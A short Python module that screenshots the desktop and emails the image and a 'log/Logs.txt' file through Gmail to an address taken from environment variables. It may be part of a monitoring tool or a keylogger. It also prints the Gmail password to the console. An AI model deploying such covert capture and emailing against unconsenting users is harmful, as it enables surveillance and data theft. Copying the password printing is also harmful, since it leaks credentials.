import os
import os.path
import yagmail
import pyautogui
from dotenv import load_dotenv
from datetime import datetime






load_dotenv()

class sendEvidences:pass

def save_screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(r'log/Evidence.png')  #Save Screenshot

def send_email():
    print(os.getenv("SEND-EMAIL") ,os.getenv("PASSWORD-GMAIL"))
    receiver_emails = [os.getenv("SEND-EMAIL")]  #Email Send
    subject = datetime.now().strftime("%d-%m-%Y %H-%M-%S")
    yag = yagmail.SMTP(os.getenv("EMAIL-GMAIL"), os.getenv("PASSWORD-GMAIL"))  #You Login Gmail

    # Archives path e Body Message
    contents = [
        '<b> <font color="#FF100" size="20"> LOGS FOUND BY THE SERVICE  </font>  </b>',
        "log/Logs.txt",
        "log/Evidence.png"
    ]

    yag.send(receiver_emails, subject, contents)
